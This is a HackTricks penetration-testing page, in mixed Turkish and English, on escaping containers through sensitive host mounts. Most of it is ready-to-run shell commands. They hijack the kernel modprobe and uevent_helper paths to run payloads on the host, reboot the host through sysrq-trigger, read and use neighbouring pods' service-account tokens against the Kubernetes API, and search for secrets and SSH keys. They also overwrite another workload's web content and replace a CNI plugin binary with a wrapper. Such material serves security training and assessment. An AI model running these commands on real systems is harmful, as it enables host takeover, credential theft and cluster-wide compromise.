# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

Host mountlar, en önemli pratik container-escape yüzeylerinden biridir; çünkü çoğu zaman dikkatle izole edilmiş bir process görünümünü doğrudan host kaynaklarının görünürlüğüne geri çevirirler. Tehlikeli durumlar yalnızca `/` ile sınırlı değildir. `/proc`, `/sys`, `/var`, runtime socketleri, kubelet-managed state veya device ile ilgili pathlerin bind mount edilmesi; kernel controls, credentials, komşu container filesystemleri ve runtime management interfaces açığa çıkarabilir.

Bu sayfa, tek tek protection sayfalarından ayrı tutulur; çünkü abuse modeli çapraz kesişimseldir. Writable bir host mount, kısmen mount namespaces, kısmen user namespaces, kısmen AppArmor veya SELinux kapsamı ve kısmen de hangi host pathinin açığa çıktığı nedeniyle tehlikelidir. Bunu ayrı bir konu olarak ele almak, attack surface'i çok daha kolay anlamayı sağlar.

## `/proc` Exposure

procfs hem sıradan process bilgilerini hem de yüksek etkili kernel control interfaces içerir. Bu nedenle `-v /proc:/host/proc` gibi bir bind mount veya beklenmedik writable proc girişlerini açığa çıkaran bir container görünümü, information disclosure, denial of service veya doğrudan host code execution'a yol açabilir.

Yüksek değerli procfs pathleri şunları içerir:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Önce hangi yüksek değerli procfs girişlerinin görünür veya writable olduğunu kontrol ederek başlayın:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
These paths are interesting for different reasons. `core_pattern`, `modprobe`, and `binfmt_misc` can become host code-execution paths when writable. `kallsyms`, `kmsg`, `kcore`, and `config.gz` kernel exploitation için güçlü reconnaissance kaynaklarıdır. `sched_debug` and `mountinfo` process, cgroup ve filesystem bağlamını ortaya çıkarır; bu da container içinden host yerleşimini yeniden oluşturmanıza yardımcı olabilir.

Her path'in pratik değeri farklıdır ve hepsini aynı etkiye sahipmiş gibi ele almak triage'ı zorlaştırır:

- `/proc/sys/kernel/core_pattern`
If writable, bu, en yüksek etkiye sahip procfs path'lerinden biridir çünkü kernel bir crash'ten sonra bir pipe handler çalıştırır. `core_pattern`'ı overlay'inde veya mounted bir host path'inde saklanan bir payload'a işaret edecek şekilde ayarlayabilen bir container, çoğu zaman host code execution elde edebilir. Ayrı bir örnek için [read-only-paths.md](protections/read-only-paths.md) bölümüne de bakın.
- `/proc/sys/kernel/modprobe`
Bu path, kernel'in module-loading logic çağırması gerektiğinde kullandığı userspace helper'ı kontrol eder. Container'dan writable ise ve host bağlamında yorumlanıyorsa, başka bir host code execution primitive'ine dönüşebilir. Özellikle helper path'ini tetiklemenin bir yolu ile birleştirildiğinde ilgi çekicidir.
- `/proc/sys/vm/panic_on_oom`
Bu genellikle temiz bir escape primitive'i değildir, ancak OOM koşullarını kernel panic davranışına çevirerek memory pressure'ı host-wide denial of service'e dönüştürebilir.
- `/proc/sys/fs/binfmt_misc`
Registration interface writable ise, attacker seçilen bir magic value için bir handler kaydedebilir ve eşleşen bir file çalıştırıldığında host-context execution elde edebilir.
- `/proc/config.gz`
Kernel exploit triage için kullanışlıdır. Host package metadata'ya ihtiyaç duymadan hangi subsystems, mitigations ve optional kernel features'ın etkin olduğunu belirlemeye yardımcı olur.
- `/proc/sysrq-trigger`
Çoğunlukla bir denial-of-service path'idir, ama çok ciddi bir tanesidir. Host'u hemen reboot edebilir, panic'e sokabilir veya başka şekilde bozabilir.
- `/proc/kmsg`
Kernel ring buffer mesajlarını gösterir. Host fingerprinting, crash analysis ve bazı ortamlarda kernel exploitation için faydalı information leak açısından kullanışlıdır.
- `/proc/kallsyms`
Okunabilir olduğunda değerlidir çünkü exported kernel symbol bilgilerini açığa çıkarır ve kernel exploit development sırasında address randomization varsayımlarını kırmaya yardımcı olabilir.
- `/proc/[pid]/mem`
Bu doğrudan bir process-memory interface'idir. Hedef process gerekli ptrace-style koşullarla erişilebilir durumdaysa, başka bir process'in memory'sini okumaya veya değiştirmeye izin verebilir. Gerçekçi etki; credentials, `hidepid`, Yama ve ptrace kısıtlamalarına büyük ölçüde bağlıdır, bu yüzden güçlü ama koşullu bir path'tir.
- `/proc/kcore`
Sistem memory'sinin core-image-style görünümünü sunar. File çok büyük ve kullanması zahmetlidir, ancak anlamlı biçimde okunabiliyorsa kötü açığa çıkmış bir host memory surface'i olduğunu gösterir.
- `/proc/kmem` and `/proc/mem`
Tarihsel olarak yüksek etkili raw memory interface'leri. Birçok modern sistemde devre dışı bırakılır veya ciddi şekilde kısıtlanır, ancak mevcut ve kullanılabilirlerse kritik bulgu olarak ele alınmalıdır.
- `/proc/sched_debug`
Scheduling ve task bilgilerini leak eder; bu da diğer process görünümleri beklenenden daha temiz görünse bile host process kimliklerini açığa çıkarabilir.
- `/proc/[pid]/mountinfo`
Container'ın host üzerinde gerçekte nerede yaşadığını, hangi path'lerin overlay-backed olduğunu ve writable bir mount'un host content'e mi yoksa sadece container layer'ına mı karşılık geldiğini yeniden oluşturmak için son derece kullanışlıdır.

If `/proc/[pid]/mountinfo` or overlay details are readable, bunları container filesystem'inin host path'ini kurtarmak için kullanın:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Bu komutlar faydalıdır çünkü birçok host-execution hilesi, container içindeki bir yolu host açısından karşılık gelen yola dönüştürmeyi gerektirir.

### Full Example: `modprobe` Helper Path Abuse

Eğer `/proc/sys/kernel/modprobe` container içinden yazılabilir durumdaysa ve helper path host bağlamında yorumlanıyorsa, saldırganın kontrol ettiği bir payload'a yönlendirilebilir:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Tetikleyici, hedefe ve kernel davranışına bağlıdır; ancak önemli nokta, yazılabilir bir helper path’in gelecekteki bir kernel helper çağrısını saldırganın kontrol ettiği host-path içeriğine yönlendirebilmesidir.

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Amaç doğrudan escape değil de exploitability assessment ise:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Bu komutlar, faydalı sembol bilgisinin görünür olup olmadığını, son kernel mesajlarının ilginç durumları açığa çıkarıp çıkarmadığını ve hangi kernel özellikleri veya mitigations’ın derlenmiş olduğunu anlamaya yardımcı olur. Etki genellikle doğrudan escape değildir, ancak kernel vulnerability triage süresini ciddi şekilde kısaltabilir.

### Full Example: SysRq Host Reboot

Eğer `/proc/sysrq-trigger` yazılabilir durumdaysa ve host view’a ulaşıyorsa:
```bash
echo b > /proc/sysrq-trigger
```
Etkisi anında host reboot olur. Bu ince bir örnek değil, ancak procfs exposure’ın information disclosure’dan çok daha ciddi olabileceğini açıkça gösterir.

## `/sys` Exposure

sysfs, çok miktarda kernel ve device state açığa çıkarır. Bazı sysfs path’leri בעיקר fingerprinting için faydalıyken, diğerleri helper execution, device behavior, security-module configuration veya firmware state’i etkileyebilir.

High-value sysfs path’leri şunlardır:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Bu path’ler farklı nedenlerle önemlidir. `/sys/class/thermal`, thermal-management davranışını etkileyebilir ve bu nedenle kötü açığa çıkarılmış ortamlarda host stability üzerinde etkili olabilir. `/sys/kernel/vmcoreinfo`, düşük seviyeli host fingerprinting için yardımcı olan crash-dump ve kernel-layout bilgisini leak edebilir. `/sys/kernel/security`, Linux Security Modules tarafından kullanılan `securityfs` interface’idir; bu yüzden buradaki beklenmedik access, MAC ile ilgili state’i açığa çıkarabilir veya değiştirebilir. EFI variable path’leri, firmware-backed boot settings’i etkileyebilir; bu da onları sıradan configuration files’dan çok daha ciddi hale getirir. `/sys/kernel/debug` altındaki `debugfs` özellikle tehlikelidir çünkü kasıtlı olarak developer-oriented bir interface’tir ve hardened production-facing kernel APIs’e kıyasla çok daha az safety expectation içerir.

Bu path’ler için faydalı review commands şunlardır:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Bu komutları ilginç yapan şey:

- `/sys/kernel/security`, AppArmor, SELinux veya başka bir LSM yüzeyinin, yalnızca host tarafında kalması gereken bir şekilde görünür olup olmadığını ortaya çıkarabilir.
- `/sys/kernel/debug` genellikle bu gruptaki en alarm verici bulgudur. `debugfs` mounted edilmiş ve okunabilir ya da yazılabilir durumdaysa, etkin debug node’larına bağlı kesin riski olan geniş bir kernel-facing yüzey bekleyin.
- EFI değişken maruziyeti daha az yaygındır, ancak varsa etkilidir; çünkü sıradan runtime dosyaları yerine firmware-backed ayarlara dokunur.
- `/sys/class/thermal` esas olarak host stability ve hardware interaction ile ilgilidir, temiz bir shell-style escape ile değil.
- `/sys/kernel/vmcoreinfo` esas olarak host-fingerprinting ve crash-analysis kaynağıdır; düşük seviyeli kernel durumunu anlamak için faydalıdır.

### Full Example: `uevent_helper`

Eğer `/sys/kernel/uevent_helper` yazılabilir durumdaysa, kernel bir `uevent` tetiklendiğinde attacker-controlled bir helper çalıştırabilir:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Bunun çalışmasının nedeni, helper yolunun host’un bakış açısından yorumlanmasıdır. Tetiklendikten sonra helper, mevcut container içinde değil, host context içinde çalışır.

## `/var` Exposure

Host’un `/var` dizinini bir container içine mount etmek, çoğu zaman `/` mount etmek kadar dramatik görünmediği için küçümsenir. Pratikte bu; runtime socket’lerine, container snapshot dizinlerine, kubelet tarafından yönetilen pod volume’lerine, projected service-account token’larına ve komşu application filesystem’lerine erişmek için yeterli olabilir. Modern node’larda `/var`, genellikle operasyonel olarak en ilginç container state’in gerçekten bulunduğu yerdir.

### Kubernetes Example

`hostPath: /var` olan bir pod, çoğu zaman diğer pod’ların projected token’larını ve overlay snapshot içeriğini okuyabilir:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Bu komutlar faydalıdır çünkü mount’un yalnızca sıradan uygulama verilerini mi yoksa yüksek etkili cluster kimlik bilgilerini mi açığa çıkardığına yanıt verir. Okunabilir bir service-account token, local code execution’ı anında Kubernetes API access’e dönüştürebilir.

Token varsa, token discovery’de durmak yerine nereye erişebildiğini doğrulayın:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Buradaki etki, yerel node erişiminden çok daha büyük olabilir. Geniş RBAC’e sahip bir token, mount edilmiş bir `/var` dizinini cluster-wide compromise’a çevirebilir.

### Docker And containerd Example

Docker hostlarda ilgili veri çoğu zaman `/var/lib/docker` altındadır; containerd-backed Kubernetes node’larda ise `/var/lib/containerd` veya snapshotter-specific path’ler altında olabilir:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Eğer mount edilmiş `/var`, başka bir workload’un yazılabilir snapshot içeriklerini açığa çıkarıyorsa, saldırgan mevcut container yapılandırmasına dokunmadan application dosyalarını değiştirebilir, web content yerleştirebilir veya startup scripts’i değiştirebilir.

Yazılabilir snapshot content bulunduğunda somut kötüye kullanım fikirleri:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Bu komutlar faydalıdır çünkü mounted `/var` için üç ana etki ailesini gösterir: application tampering, secret recovery ve komşu workloads içine lateral movement.

## Kubelet State, Plugins, And CNI Paths

`/var/lib/kubelet`, `/opt/cni/bin` veya `/etc/cni/net.d` montajı çoğu zaman privileged DaemonSets, CNI agents, CSI node plugins, GPU operators ve storage helpers üzerinden açığa çıkar. Bu montajlar "node plumbing" olarak göz ardı edilmesi kolaydır, ancak yeni pods için execution path üzerinde doğrudan yer alırlar ve çoğu zaman kubelet credentials, projected secrets, registration sockets ve executable host-side plugin binaries içerirler.

High-value targets şunlardır:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Faydalı review komutları şunlardır:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Neden bu yollar önemli:

- `/var/lib/kubelet/pki` kubelet client certificates ve diğer node-local credentials’ı açığa çıkarabilir; bunlar bazı durumlarda cluster tasarımına bağlı olarak API server veya kubelet-facing TLS endpoints’e karşı yeniden kullanılabilir.
- `/var/lib/kubelet/pods` çoğu zaman aynı node üzerindeki neighboring pods için projected service-account tokens ve mounted Secrets içerir.
- `/var/lib/kubelet/pod-resources/kubelet.sock` esasen bir reconnaissance surface’idir, ama çok faydalıdır: hangi pods ve containers’ın şu anda GPUs, hugepages, SR-IOV devices ve diğer scarce node-local resources’u kullandığını gösterir.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` ve `/var/lib/kubelet/plugins_registry` hangi CSI, DRA ve device plugins’in kurulu olduğunu ve kubelet’in hangi sockets ile konuşmasının beklendiğini gösterir. Bu dizinler sadece readable değil de writable ise, finding çok daha ciddi hale gelir.
- `/opt/cni/bin` ve `/etc/cni/net.d` doğrudan pod-network setup path’i üzerindedir. Orada writable access, çoğu zaman sadece configuration exposure değil, gecikmeli bir host-execution primitive anlamına gelir.

### Full Example: Writable `/opt/cni/bin`

Eğer host CNI binary directory read-write olarak mount edilmişse, bir plugin’i değiştirmek, kubelet o node üzerinde bir sonraki kez bir pod sandbox oluşturduğunda host execution elde etmek için yeterli olabilir:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Bu, mounted bir `docker.sock` kadar anında değildir, ancak compromised Kubernetes infrastructure pod'larında genellikle daha gerçekçidir. Önemli nokta, modified binary'nin daha sonra current container tarafından değil, host network setup flow tarafından execute edilmesidir.


## Runtime Sockets

Sensitive host mounts genellikle full directory'ler yerine runtime socket'ler içerir. Bunlar o kadar önemlidir ki burada açıkça tekrar edilmeyi hak ederler:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Bu soketlerden biri mount edildiğinde tam exploitation akışları için [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) dosyasına bakın.

Hızlı bir ilk etkileşim paterni olarak:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Eğer bunlardan biri başarılı olursa, "mounted socket"ten "daha ayrıcalıklı bir sibling container başlatma" yolı genelde herhangi bir kernel breakout yolundan çok daha kısadır.

## Mount-Related CVEs

Host mounts ayrıca runtime vulnerabilities ile kesişir. Önemli yakın tarihli örnekler:

- `CVE-2024-21626` in `runc`, where a leaked directory file descriptor could place the working directory on the host filesystem.
- `CVE-2024-23651`, `CVE-2024-23652`, and `CVE-2024-23653` in BuildKit, where malicious Dockerfiles, frontends, and `RUN --mount` flows could reintroduce host file access, deletion, or elevated privileges during builds.
- `CVE-2024-1753` in Buildah and Podman build flows, where crafted bind mounts during build could expose `/` read-write.
- `CVE-2025-47290` in `containerd` 2.1.0, where a TOCTOU during image unpack could let a specially crafted image modify the host filesystem during pull.

Bu CVE'ler burada önemlidir çünkü mount handling'in yalnızca operator configuration ile ilgili olmadığını gösterir. Runtime'ın kendisi de mount-driven escape conditions introduce edebilir.

## Checks

En yüksek değerli mount exposures'ları hızlıca bulmak için bu komutları kullanın:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Burada ilginç olan:

- Host root, `/proc`, `/sys`, `/var` ve runtime sockets hepsi yüksek öncelikli bulgulardır.
- Writable proc/sys girdileri çoğu zaman mount'un güvenli bir container görünümü yerine host-genel kernel kontrollerini açığa çıkardığı anlamına gelir.
- Mounted `/var` path'leri yalnızca filesystem incelemesi değil, credential ve neighboring-workload incelemesini de hak eder.
- Kubelet state directories ve CNI/plugin path'leri, runtime sockets ile aynı önceliği hak eder çünkü çoğu zaman doğrudan node'un pod-creation ve credential-distribution path'inin üzerinde yer alırlar.

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
